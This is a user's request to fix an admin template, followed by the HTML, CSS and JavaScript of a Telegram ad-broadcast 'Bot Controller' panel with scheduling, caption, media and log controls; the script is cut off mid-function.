you want to rewrite entire fix all files and working 





fix templates/admin.html and backend sai properly connect kr 

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bot Controller | Admin Panel</title>
<link rel="icon" href="data:,">
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
:root{--bg-primary:#0a0a0f;--bg-secondary:#12121a;--bg-card:#16161f;--bg-hover:#1e1e2a;
--accent-primary:#6366f1;--accent-secondary:#8b5cf6;--accent-gradient:linear-gradient(135deg,#6366f1,#8b5cf6);
--text-primary:#f8fafc;--text-secondary:#94a3b8;--text-muted:#64748b;--border-color:rgba(255,255,255,.08);
--success:#10b981;--danger:#ef4444;--warning:#f59e0b;--glass:rgba(255,255,255,.03)}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;background:var(--bg-primary);color:var(--text-primary);min-height:100vh;line-height:1.6}
.video-bg{position:fixed;inset:0;width:100%;height:100%;object-fit:cover;z-index:-2;opacity:.3}
body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle at 20% 80%,rgba(99,102,241,.18),transparent 55%),radial-gradient(circle at 80% 20%,rgba(139,92,246,.12),transparent 55%),rgba(10,10,15,.85);z-index:-1}
.container{max-width:1440px;margin:0 auto;padding:40px 24px}
.header{margin-bottom:36px;padding-bottom:26px;border-bottom:1px solid var(--border-color)}
.header-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;gap:12px;flex-wrap:wrap}
.logo{font-family:'Space Grotesk';font-size:28px;font-weight:700;background:var(--accent-gradient);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.header-actions{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
.status-badge{display:inline-flex;align-items:center;gap:8px;padding:8px 16px;background:var(--glass);border:1px solid var(--border-color);border-radius:100px;font-size:13px;font-weight:500;color:var(--text-secondary);text-decoration:none;cursor:pointer}
.status-badge.online::before{content:'';width:8px;height:8px;background:var(--success);border-radius:50%;box-shadow:0 0 8px var(--success)}
.status-badge.offline::before{content:'';width:8px;height:8px;background:var(--warning);border-radius:50%}
.status-badge.err{border-color:rgba(239,68,68,.5);color:#fca5a5}
.subtitle{color:var(--text-muted);font-size:15px}
.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:18px;margin-bottom:36px}
.stat-card{background:var(--bg-card);border:1px solid var(--border-color);border-radius:16px;padding:22px;position:relative;overflow:hidden}
.stat-card::before{content:'';position:absolute;top:0;left:0;width:100%;height:2px;background:var(--accent-gradient);transform:scaleX(0);transition:.3s}
.stat-card:hover::before{transform:scaleX(1)}
.stat-label{font-size:12px;text-transform:uppercase;letter-spacing:1px;color:var(--text-muted);margin-bottom:8px;font-weight:600}
.stat-value{font-family:'Space Grotesk';font-size:30px;font-weight:700}
.stat-change{font-size:13px;color:var(--text-muted)}
.stat-change.positive{color:var(--success)}
.main-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:22px;margin-bottom:22px}
@media(max-width:1000px){.main-grid{grid-template-columns:1fr}}
@media(max-width:560px){.container{padding:24px 14px}.logo{font-size:21px}.stat-value{font-size:25px}}
.card{background:var(--bg-card);border:1px solid var(--border-color);border-radius:20px;overflow:hidden}
.card-header{padding:22px 22px 0;margin-bottom:8px;display:flex;justify-content:space-between;align-items:flex-start;gap:12px;flex-wrap:wrap}
.card-title{font-family:'Space Grotesk';font-size:18px;font-weight:600;margin-bottom:4px}
.card-subtitle{font-size:13px;color:var(--text-muted)}
.card-body{padding:22px}
.control-grid{display:grid;gap:14px}
.control-btn{display:flex;align-items:center;gap:16px;padding:18px;background:var(--glass);border:1px solid var(--border-color);border-radius:12px;cursor:pointer;text-align:left;width:100%;color:var(--text-primary);transition:.3s;font-family:inherit}
.control-btn:hover{background:var(--bg-hover);border-color:var(--accent-primary);transform:translateX(4px)}
.control-btn.danger:hover{border-color:var(--danger)}
.control-icon{width:46px;height:46px;border-radius:12px;background:var(--bg-secondary);display:flex;align-items:center;justify-content:center;flex-shrink:0}
.control-icon svg{width:22px;height:22px;stroke:var(--text-secondary)}
.control-content{flex:1}
.control-title{font-weight:600;font-size:15px}
.control-desc{font-size:13px;color:var(--text-muted)}
.quick-stats{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
.quick-stat{padding:18px;background:var(--glass);border-radius:12px;border:1px solid var(--border-color)}
.quick-stat-value{font-family:'Space Grotesk';font-size:23px;font-weight:700}
.quick-stat-label{font-size:12px;color:var(--text-muted);text-transform:uppercase}
.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.82);backdrop-filter:blur(8px);z-index:1000;justify-content:center;align-items:center;padding:24px}
.modal-overlay.active{display:flex}
.modal{background:var(--bg-card);border:1px solid var(--border-color);border-radius:22px;width:100%;max-width:600px;max-height:90vh;overflow:hidden;animation:ms .3s ease}
@keyframes ms{from{opacity:0;transform:translateY(20px) scale(.95)}to{opacity:1;transform:translateY(0) scale(1)}}
.modal-header{padding:22px 22px 0;display:flex;justify-content:space-between;align-items:center}
.modal-title{font-family:'Space Grotesk';font-size:19px;font-weight:600}
.modal-close{width:34px;height:34px;border-radius:10px;border:1px solid var(--border-color);background:transparent;color:var(--text-muted);cursor:pointer}
.modal-body{padding:22px;overflow-y:auto;max-height:72vh}
.form-group{margin-bottom:18px}
.form-label{display:block;font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:.5px;color:var(--text-muted);margin-bottom:8px}
.form-input,.form-textarea{width:100%;padding:13px 15px;background:var(--bg-secondary);border:1px solid var(--border-color);border-radius:12px;color:var(--text-primary);font-size:14px;font-family:inherit}
.form-input:focus,.form-textarea:focus{outline:none;border-color:var(--accent-primary)}
.form-textarea{min-height:120px;resize:vertical}
.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;padding:13px 22px;border-radius:12px;font-size:14px;font-weight:600;cursor:pointer;border:none;width:100%;transition:.2s;font-family:inherit}
.btn-primary{background:var(--accent-gradient);color:#fff}
.btn-primary:hover{transform:translateY(-2px)}
.btn-secondary{background:var(--bg-secondary);color:var(--text-primary);border:1px solid var(--border-color)}
.btn-danger{background:rgba(239,68,68,.1);color:var(--danger);border:1px solid rgba(239,68,68,.2)}
.btn-group{display:flex;gap:10px}
.btn-group .btn{flex:1}
.btn-sm{padding:7px 13px;font-size:12.5px;width:auto}
.toast-container{position:fixed;bottom:22px;right:22px;z-index:2000;display:flex;flex-direction:column;gap:10px}
.toast{padding:15px 19px;background:var(--bg-card);border:1px solid var(--border-color);border-radius:12px;font-size:14px;font-weight:500;box-shadow:0 8px 32px rgba(0,0,0,.4);max-width:340px}
.toast.success{border-color:var(--success);background:rgba(16,185,129,.1)}
.toast.error{border-color:var(--danger);background:rgba(239,68,68,.1)}
.toggle-wrapper{display:flex;align-items:center;justify-content:space-between;padding:18px;background:var(--glass);border-radius:12px;border:1px solid var(--border-color);cursor:pointer}
.toggle-info h4{font-size:15px;font-weight:600;margin-bottom:4px}
.toggle-info p{font-size:13px;color:var(--text-muted)}
.toggle-switch{position:relative;width:52px;height:28px;background:var(--bg-secondary);border-radius:14px;transition:.3s;border:1px solid var(--border-color);flex-shrink:0}
.toggle-switch.active{background:var(--accent-primary);border-color:var(--accent-primary)}
.toggle-switch::after{content:'';position:absolute;top:3px;left:3px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.3s}
.toggle-switch.active::after{left:27px}
.ad-item{background:var(--bg-secondary);border:1px solid var(--border-color);border-radius:12px;padding:15px;margin-bottom:10px}
.ad-item .tag{font-size:11px;color:var(--accent-secondary);font-weight:600;text-transform:uppercase}
.ad-item .lbl{font-weight:600;margin:4px 0}
.ad-item .url{color:var(--text-muted);font-size:12px;word-break:break-all}
.ad-item.off{opacity:.5}
.preview-image{width:100%;border-radius:12px;margin-bottom:14px;display:block}
.muted{color:var(--text-muted);font-size:13px}
.spin{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:sp .6s linear infinite}
@keyframes sp{to{transform:rotate(360deg)}}
.ad-preview{background:#0e1621;border:1px solid var(--border-color);border-radius:12px;padding:12px;max-width:380px;margin:0 auto}
.ad-preview-media{width:100%;border-radius:8px;margin-bottom:8px;display:block}
.ad-preview-caption{font-size:13px;color:#e4e6eb;white-space:pre-wrap;word-break:break-word;line-height:1.4}
.ad-preview-caption a{color:#7dd3fc}
.log-toolbar{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
.chip{padding:6px 12px;border-radius:100px;border:1px solid var(--border-color);background:var(--glass);color:var(--text-secondary);font-size:12px;font-weight:600;cursor:pointer;font-family:inherit}
.chip.active{background:var(--accent-gradient);color:#fff;border-color:transparent}
.chip .n{opacity:.75;margin-left:5px}
.logbox{background:#08080e;border:1px solid var(--border-color);border-radius:14px;height:380px;overflow-y:auto;font-family:'SF Mono',Menlo,Consolas,monospace;font-size:12px;padding:10px;scroll-behavior:smooth}
.logline{display:flex;gap:10px;padding:3px 7px;border-radius:6px;white-space:pre-wrap;word-break:break-word}
.logline:hover{background:rgba(255,255,255,.035)}
.lts{color:#475569;flex-shrink:0}
.lvl{flex-shrink:0;font-weight:700;width:58px}
.lmsg{color:#cbd5e1;flex:1}
.logline.info .lvl{color:#64748b}
.logline.success .lvl{color:#10b981}
.logline.warn .lvl{color:#f59e0b}
.logline.error .lvl{color:#ef4444}
.logline.error{background:rgba(239,68,68,.08)}
.logline.error .lmsg{color:#fca5a5}
.logbox.f-info .logline:not(.info){display:none}
.logbox.f-success .logline:not(.success){display:none}
.logbox.f-warn .logline:not(.warn){display:none}
.logbox.f-error .logline:not(.error){display:none}
.alert-banner{display:none;align-items:flex-start;gap:10px;padding:14px 16px;border-radius:12px;background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.35);color:#fca5a5;font-size:13px;margin-bottom:14px}
.alert-banner.show{display:flex}
.chk{display:flex;align-items:center;gap:10px;padding:9px 0;border-bottom:1px solid var(--border-color);font-size:13.5px}
.chk:last-child{border-bottom:none}
.chk .dot{width:9px;height:9px;border-radius:50%;flex-shrink:0}
.chk.ok .dot{background:var(--success);box-shadow:0 0 8px var(--success)}
.chk.bad .dot{background:var(--danger);box-shadow:0 0 8px var(--danger)}
.chk.bad .lbl{color:#fca5a5}
.chk .detail{margin-left:auto;color:var(--text-muted);font-size:12px}
</style>
</head>
<body>
<video class="video-bg" autoplay muted loop playsinline src="{{ bg_video }}"></video>

<div class="container">
  <header class="header">
    <div class="header-top">
      <h1 class="logo">BOT CONTROLLER</h1>
      <div class="header-actions">
        <span class="status-badge {{ 'online' if stats.broadcaster_running else 'offline' }}" id="sysBadge">
          {{ 'Scheduler Running' if stats.broadcaster_running else 'Scheduler Idle' }}
        </span>
        <span class="status-badge" id="errBadge" onclick="showErrorsOnly()">Errors: 0</span>
        <a class="status-badge" href="stats">Stats</a>
        <a class="status-badge" href="logout">Logout</a>
      </div>
    </div>
    <p class="subtitle">Broadcast timing, text-link ads, media and live diagnostics</p>
  </header>

  <div class="stats-grid">
    <div class="stat-card"><div class="stat-label">Total Users</div>
      <div class="stat-value" id="statTotal">{{ stats.total_users }}</div>
      <div class="stat-change">Registered accounts</div></div>
    <div class="stat-card"><div class="stat-label">Subscribed</div>
      <div class="stat-value" id="statSubscribed">{{ stats.opted_in }}</div>
      <div class="stat-change positive">+{{ stats.recent_users }} today</div></div>
    <div class="stat-card"><div class="stat-label">Deliveries</div>
      <div class="stat-value" id="statDeliveries">{{ stats.total_deliveries }}</div>
      <div class="stat-change">Successful sends</div></div>
    <div class="stat-card"><div class="stat-label">Broadcast</div>
      <div class="stat-value" id="statBroadcast" style="font-size:23px">
        {{ 'ACTIVE' if config.ads_enabled else 'PAUSED' }}</div>
      <div class="stat-change" id="statInterval">{{ (config.interval or 1800) // 60 }}min interval</div></div>
  </div>

  <div class="main-grid">
    <div class="card">
      <div class="card-header"><div><h2 class="card-title">Control Panel</h2>
        <p class="card-subtitle">Everything that goes out in the broadcast</p></div></div>
      <div class="card-body"><div class="control-grid">

        <div class="toggle-wrapper" id="toggleWrap" onclick="toggleAds()">
          <div class="toggle-info"><h4>Broadcast Service</h4>
            <p id="toggleStatus">{{ 'Running' if config.ads_enabled else 'Stopped' }}</p></div>
          <div class="toggle-switch {{ 'active' if config.ads_enabled else '' }}" id="toggleSwitch"></div>
        </div>

        <div class="toggle-wrapper" id="delWrap" onclick="toggleDelete()">
          <div class="toggle-info"><h4>Delete Previous Ads</h4>
            <p id="delStatus">{{ 'Old ads are deleted before each new send' if config.delete_after_round else 'Old ads are kept' }}</p></div>
          <div class="toggle-switch {{ 'active' if config.delete_after_round else '' }}" id="delSwitch"></div>
        </div>

        <button class="control-btn" onclick="broadcastNow(this)">
          <div class="control-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg></div>
          <div class="control-content"><div class="control-title">Send Now</div>
            <div class="control-desc">Force an immediate round for every user</div></div>
        </button>

        <button class="control-btn" onclick="openModal('intervalModal')">
          <div class="control-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg></div>
          <div class="control-content"><div class="control-title">Set Interval</div>
            <div class="control-desc">First ad after this interval, then repeats</div></div>
        </button>

        <button class="control-btn" onclick="openModal('adsModal')">
          <div class="control-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg></div>
          <div class="control-content"><div class="control-title">Ad Links</div>
            <div class="control-desc">Text that opens a URL when tapped</div></div>
        </button>

        <button class="control-btn" onclick="openModal('photoModal')">
          <div class="control-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/></svg></div>
          <div class="control-content"><div class="control-title">Upload Media</div>
            <div class="control-desc">Photo or video attached to the ad</div></div>
        </button>

        <button class="control-btn" onclick="openModal('captionModal')">
          <div class="control-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z"/></svg></div>
          <div class="control-content"><div class="control-title">Edit Caption</div>
            <div class="control-desc">Main message text</div></div>
        </button>

        <button class="control-btn" onclick="openPreview()">
          <div class="control-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></div>
          <div class="control-content"><div class="control-title">Preview Ad</div>
            <div class="control-desc">Exactly as it will be sent</div></div>
        </button>

        <button class="control-btn" onclick="openDiagnostics()">
          <div class="control-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg></div>
          <div class="control-content"><div class="control-title">Diagnostics</div>
            <div class="control-desc">Check why sending might fail</div></div>
        </button>

        <button class="control-btn danger" onclick="openModal('resetModal')">
          <div class="control-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12a9 9 0 109-9 9.75 9.75 0 00-6.74 2.74L3 8"/><path d="M3 3v5h5"/></svg></div>
          <div class="control-content"><div class="control-title">Reset Ads</div>
            <div class="control-desc">Restore default ad links</div></div>
        </button>

      </div></div>
    </div>

    <div class="card">
      <div class="card-header"><div><h2 class="card-title">Live Activity</h2>
        <p class="card-subtitle">Real-time system metrics</p></div></div>
      <div class="card-body"><div class="quick-stats">
        <div class="quick-stat"><div class="quick-stat-value" id="quickSessions">{{ stats.active_sessions or 0 }}</div>
          <div class="quick-stat-label">Active Sessions</div></div>
        <div class="quick-stat"><div class="quick-stat-value" id="quickBroadcastMode">{{ stats.broadcast_mode_users or 0 }}</div>
          <div class="quick-stat-label">In Broadcast Mode</div></div>
        <div class="quick-stat"><div class="quick-stat-value" id="quickOnline">{{ stats.online_users or 0 }}</div>
          <div class="quick-stat-label">Sent Last Hour</div></div>
        <div class="quick-stat"><div class="quick-stat-value" id="quickRegisteredToday">{{ stats.registered_today or 0 }}</div>
          <div class="quick-stat-label">Registered Today</div></div>
      </div>
      <div id="miniDiag" class="muted" style="margin-top:14px"></div>
      </div>
    </div>
  </div>

  <div class="card" style="margin-bottom:24px">
    <div class="card-header">
      <div><h2 class="card-title">Broadcast Log</h2>
        <p class="card-subtitle">Live send activity, warnings and errors</p></div>
      <div class="log-toolbar">
        <button class="chip active" data-f="all" onclick="setFilter('all')">All <span class="n" id="cAll">0</span></button>
        <button class="chip" data-f="success" onclick="setFilter('success')">OK <span class="n" id="cOk">0</span></button>
        <button class="chip" data-f="info" onclick="setFilter('info')">Info <span class="n" id="cInfo">0</span></button>
        <button class="chip" data-f="warn" onclick="setFilter('warn')">Warn <span class="n" id="cWarn">0</span></button>
        <button class="chip" data-f="error" onclick="setFilter('error')">Error <span class="n" id="cErr">0</span></button>
        <button class="chip" id="pauseChip" onclick="togglePause()">Pause</button>
        <button class="chip" onclick="clearLogs()">Clear</button>
      </div>
    </div>
    <div class="card-body">
      <div class="alert-banner" id="errBanner">
        <strong>Last error:</strong><span id="errText"></span>
      </div>
      <div class="logbox f-all" id="logBox"></div>
    </div>
  </div>
</div>

<div class="modal-overlay" id="intervalModal" onclick="closeModalOnOverlay(event,'intervalModal')">
  <div class="modal"><div class="modal-header"><h3 class="modal-title">Set Interval</h3>
    <button class="modal-close" onclick="closeModal('intervalModal')">✕</button></div>
  <div class="modal-body">
    <p class="muted" style="margin-bottom:14px">A newly linked ID receives its first ad after exactly one interval, then keeps repeating. Min 1, max 1440 minutes.</p>
    <div class="form-group"><label class="form-label">Interval (minutes)</label>
      <input class="form-input" type="number" id="intervalInput" min="1" max="1440" value="{{ (config.interval or 1800) // 60 }}"></div>
    <button class="btn btn-primary" onclick="saveInterval(this)">Save Interval</button>
  </div></div>
</div>

<div class="modal-overlay" id="adsModal" onclick="closeModalOnOverlay(event,'adsModal')">
  <div class="modal"><div class="modal-header"><h3 class="modal-title">Ad Links</h3>
    <button class="modal-close" onclick="closeModal('adsModal')">✕</button></div>
  <div class="modal-body">
    <div id="adList"><p class="muted">Loading…</p></div>
    <hr style="border:none;border-top:1px solid var(--border-color);margin:16px 0">
    <h4 id="adFormTitle" style="font-family:'Space Grotesk';margin-bottom:12px">Add Text Link</h4>
    <input type="hidden" id="adId">

    <div class="form-group"><label class="form-label">Displayed text (tap opens the link)</label>
      <input class="form-input" id="adText" placeholder="e.g. Join our channel for daily content"></div>

    <div class="form-group"><label class="form-label">Destination URL</label>
      <input class="form-input" id="adUrl" placeholder="https://..."></div>

    <div class="toggle-wrapper" style="margin-bottom:16px" onclick="toggleAdEnabled()">
      <div class="toggle-info"><h4>Enabled</h4><p>Include in every broadcast</p></div>
      <div class="toggle-switch active" id="adEnabledToggle"></div>
    </div>

    <div class="btn-group">
      <button class="btn btn-primary" onclick="saveAd(this)">Save Link</button>
      <button class="btn btn-secondary" onclick="clearAdForm()">Clear</button>
    </div>
    <p class="muted" style="margin-top:12px">Every link is appended to the caption on its own line. Add as many as you want.</p>
  </div></div>
</div>

<div class="modal-overlay" id="photoModal" onclick="closeModalOnOverlay(event,'photoModal')">
  <div class="modal"><div class="modal-header"><h3 class="modal-title">Upload Media</h3>
    <button class="modal-close" onclick="closeModal('photoModal')">✕</button></div>
  <div class="modal-body">
    <div class="form-group"><input type="file" id="photoInput" accept="image/*,video/*" onchange="uploadPhoto(this)"></div>
    <div id="mediaWrap" {% if not config.media_path and not config.photo_path %}style="display:none"{% endif %}>
      <img class="preview-image" id="photoPrev" style="display:none">
      <video class="preview-image" id="videoPrev" controls style="display:none"></video>
      <button class="btn btn-danger" onclick="removePhoto(this)">Remove Media</button>
    </div>
    <p class="muted" style="margin-top:12px">Heroku wipes the disk on restart — re-upload if the log says MEDIA MISSING.</p>
  </div></div>
</div>

<div class="modal-overlay" id="captionModal" onclick="closeModalOnOverlay(event,'captionModal')">
  <div class="modal"><div class="modal-header"><h3 class="modal-title">Edit Caption</h3>
    <button class="modal-close" onclick="closeModal('captionModal')">✕</button></div>
  <div class="modal-body">
    <div class="form-group"><label class="form-label">Broadcast Message</label>
      <textarea class="form-textarea" id="captionText">{{ config.caption or '' }}</textarea></div>
    <div class="toggle-wrapper" style="margin-bottom:16px" onclick="toggleCaptionHtml()">
      <div class="toggle-info"><h4>Caption uses HTML</h4><p>Allow &lt;b&gt;, &lt;i&gt;, &lt;a&gt; tags</p></div>
      <div class="toggle-switch {{ 'active' if config.caption_is_html else '' }}" id="capHtmlToggle"></div>
    </div>
    <button class="btn btn-primary" onclick="saveCaption(this)">Save Changes</button>
  </div></div>
</div>

<div class="modal-overlay" id="previewModal" onclick="closeModalOnOverlay(event,'previewModal')">
  <div class="modal"><div class="modal-header"><h3 class="modal-title">Ad Preview</h3>
    <button class="modal-close" onclick="closeModal('previewModal')">✕</button></div>
  <div class="modal-body">
    <p class="muted" style="margin-bottom:14px">Exactly as it will appear in Telegram:</p>
    <div class="ad-preview" id="adPreviewBox"><p class="muted">Loading…</p></div>
  </div></div>
</div>

<div class="modal-overlay" id="diagModal" onclick="closeModalOnOverlay(event,'diagModal')">
  <div class="modal"><div class="modal-header"><h3 class="modal-title">Diagnostics</h3>
    <button class="modal-close" onclick="closeModal('diagModal')">✕</button></div>
  <div class="modal-body"><div id="diagBody"><p class="muted">Loading…</p></div></div>
</div>

<div class="modal-overlay" id="resetModal" onclick="closeModalOnOverlay(event,'resetModal')">
  <div class="modal"><div class="modal-header"><h3 class="modal-title">Reset ads?</h3>
    <button class="modal-close" onclick="closeModal('resetModal')">✕</button></div>
  <div class="modal-body">
    <p class="muted">Restores the default ad links and clears caption + media. Interval and running state are kept.</p>
    <div class="btn-group" style="margin-top:16px">
      <button class="btn btn-secondary" onclick="closeModal('resetModal')">Cancel</button>
      <button class="btn btn-danger" onclick="doReset(this)">Yes, Reset</button>
    </div>
  </div></div>
</div>

<div class="toast-container" id="toastContainer"></div>

<script>
const BASE = "{{ url_for('admin.admin_panel') }}".replace(/\/+$/, '');
const API  = BASE + '/api';
const CSRF = "{{ csrf }}";
let ADS = [], AD_ENABLED = true;
let LOG_LAST = 0, LOG_PAUSED = false;

function openModal(id){
  document.getElementById(id).classList.add('active');
  if(id === 'adsModal') loadAds();
}
function closeModal(id){ document.getElementById(id).classList.remove('active'); }
function closeModalOnOverlay(e,id){ if(e.target.id === id) closeModal(id); }

function showToast(m, type){
  type = type || 'success';
  const t = document.createElement('div');
  t.className = 'toast ' + type;
  t.textContent = m;
  document.getElementById('toastContainer').appendChild(t);
  setTimeout(() => t.remove(), 3200);
}
function esc(s){ const d = document.createElement('div'); d.textContent = (s == null ? '' : String(s)); return d.innerHTML; }
function validUrl(u){ return /^https?:\/\/.+/.test(u || ''); }

async function api(path, opts){
  opts = opts || {};
  opts.headers = Object.assign({}, opts.headers, {'X-CSRF-Token': CSRF});
  let r;
  try { r = await fetch(API + path, opts); }
  catch(e){ showToast('Network error', 'error'); return {success:false}; }
  if(r.status === 401){ location.href = BASE + '/login'; return {success:false}; }
  try { return await r.json(); } catch { return {success:false, error:'bad response'}; }
}
async function withBusy(btn, fn){
  const prev = btn ? btn.innerHTML : null;
  if(btn){ btn.disabled = true; btn.innerHTML = '<span class="spin"></span>'; }
  try { return await fn(); }
  finally { if(btn){ btn.disabled = false; btn.innerHTML = prev; } }
}

function setScheduler(running){
  running = !!running;
  const b = document.getElementById('sysBadge');
  b.classList.toggle('online', running);
  b.classList.toggle('offline', !running);
  b.textContent = running ? 'Scheduler Running' : 'Scheduler Idle';
  document.getElementById('toggleSwitch').classList.toggle('active', running);
  document.getElementById('toggleStatus').textContent = running ? 'Running' : 'Stopped';
  document.getElementById('statBroadcast').textContent = running ? 'ACTIVE' : 'PAUSED';
}
async function toggleAds(){
  const w = document.getElementById('toggleWrap');
  if(w.dataset.busy === '1') return;
  w.dataset.busy = '1';
  const d = await api('/toggle-ads', {method:'POST'});
  w.dataset.busy = '';
  if(d && d.success){ setScheduler(d.enabled); showToast(d.message || 'Updated'); }
  else showToast((d && d.error) || 'Failed', 'error');
}
async function toggleDelete(){
  const w = document.getElementById('delWrap');
  if(w.dataset.busy === '1') return;
  w.dataset.busy = '1';
  const d = await api('/toggle-delete-after-round', {method:'POST'});
  w.dataset.busy = '';
  if(d && d.success){
    const on = !!d.delete_after_round;
    document.getElementById('delSwitch').classList.toggle('active', on);
    document.getElementById('delStatus').textContent = on
      ? 'Old ads are deleted before each new send'
      : 'Old ads are kept';
    showToast(d.message || 'Updated');
  } else showToast((d && d.error) || 'Failed', 'error');
}
async function broadcastNow(btn){
  await withBusy(btn, async () => {
    const d = await api('/broadcast-now', {method:'POST'});
    if(d && d.success){ showToast(d.message); setFilter('all'); pollLogs(); }
    else showToast((d && d.error) || 'Failed', 'error');
  });
}

async function saveInterval(btn){
  const v = parseInt(document.getElementById('intervalInput').value, 10);
  if(!v || v < 1 || v > 1440){ showToast('Interval must be 1-1440 minutes', 'error'); return; }
  await withBusy(btn, async () => {
    const d = await api('/set-interval', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({interval:v})});
    if(d && d.success){ document.getElementById('statInterval').textContent = v + 'min interval'; showToast(d.message); closeModal('intervalModal'); }
    else showToast((d && d.error) || 'Failed', 'error');
  });
}
async function saveCaption(btn){
  await withBusy(btn, async () => {
    const d = await api('/set-caption', {method:'POST', headers:{'Content-Type':'application/json'},
      body:JSON.stringify({caption:document.getElementById('captionText').value,
                           caption_is_html:document.getElementById('capHtmlToggle').classList.contains('active')})});
    if(d && d.success){ showToast(d.message); closeModal('captionModal'); }
    else showToast((d && d.error) || 'Failed', 'error');
  });
}
function toggleCaptionHtml(){ document.getElementById('capHtmlToggle').classList.toggle('active'); }

async function uploadPhoto(input){
  if(!input.files || !input.files[0]) return;
  const fd = new FormData(); fd.append('photo', input.files[0]);
  const d = await api('/upload-photo', {method:'POST', body:fd});
  if(d && d.success){
    document.getElementById('mediaWrap').style.display = 'block';
    const img = document.getElementById('photoPrev'), vid = document.getElementById('videoPrev');
    if(d.media_type === 'video'){ vid.src = BASE + '/uploads/' + d.media_file + '?t=' + Date.now(); vid.style.display = 'block'; img.style.display = 'none'; }
    else { img.src = BASE + '/uploads/' + d.media_file + '?t=' + Date.now(); img.style.display = 'block'; vid.style.display = 'none'; }
    showToast(d.message);
  } else showToast((d && d.error) || 'Failed', 'error');
  input.value = '';
}
async function removePhoto(btn){
  await withBusy(btn, async () => {
    const d = await api('/remove-photo', {method:'POST'});
    if(d && d.success){ document.getElementById('mediaWrap').style.display = 'none'; showToast(d.message); }
    else showToast((d && d.error) || 'Failed', 'error');
  });
}

async function loadAds(){
  const d = await api('/config');
  ADS = (d && d.ads) || [];
  renderAds();
}
function renderAds(){
  const box = document.getElementById('adList');
  if(!ADS.length){ box.innerHTML = '<p class="muted">No ad links yet.</p>'; return; }
  box.innerHTML = ADS.map(a => {
    const label = a.text || a.label || '(no text)';
    return `<div class="ad-item ${a.enabled === false ? 'off' : ''}">
      <div class="tag">Text link${a.enabled === false ? ' • disabled' : ''}</div>
      <div class="lbl">${esc(label)}</div>
      <div class="url">${esc(a.url)}</div>
      <div class="btn-group" style="margin-top:10px">
        <button class="btn btn-secondary btn-sm" onclick="editAd('${esc(a.id)}')">Edit</button>
        <button class="btn btn-danger btn-sm" onclick="delAd('${esc(a.id)}',this)">Delete</button>
      </div></div>`;
  }).join('');
}
function editAd(id){
  const a = ADS.find(x => x.id === id); if(!a) return;
  document.getElementById('adId').value = a.id;
  document.getElementById('adText').value = a.text || a.label || '';
  document.getElementById('adUrl').value = a.url || '';
  setAdEnabled(a.enabled !== false);
  document.getElementById('adFormTitle').textContent = 'Edit Text Link';
}
function clearAdForm(){
  document.getElementById('adId').value = '';
  document.getElementById('adText').value = '';
  document.getElementById('adUrl').value = '';
  setAdEnabled(true);
  document.getElementById('adFormTitle').textContent = 'Add Text Link';
}
function setAdEnabled(on){
  AD_ENABLED = !!on;
  document.getElementById('adEnabledToggle').classList.toggle('active', AD_ENABLED);
}
function toggleAdEnabled(){ setAdEnabled(!AD_ENABLED); }

async function saveAd(btn){
  const id = document.getElementById('adId').value;
  const body = {text:document.getElementById('adText').value,
                url:document.getElementById('adUrl').value, enabled:AD_ENABLED};
  if(!body.text.trim()){ showToast('Displayed text required', 'error'); return; }
  if(!validUrl(body.url)){ showToast('URL must start with http:// or https://', 'error'); return; }
  await withBusy(btn, async () => {
    const d = id
      ? await api('/ads/' + id, {method:'PUT', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body)})
      : await api('/ads', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body)});
    if(d && d.success){ ADS = d.ads; renderAds(); clearAdForm(); showToast(d.message); }
    else showToast((d && d.error) || 'Failed', 'error');
  });
}
async function delAd(id, btn){
  await withBusy(btn, async () => {
    const d = await api('/ads/' + id, {method:'DELETE'});
    if(d && d.success){ ADS = d.ads; renderAds(); showToast(d.message); }
    else showToast((d && d.error) || 'Failed', 'error');
  });
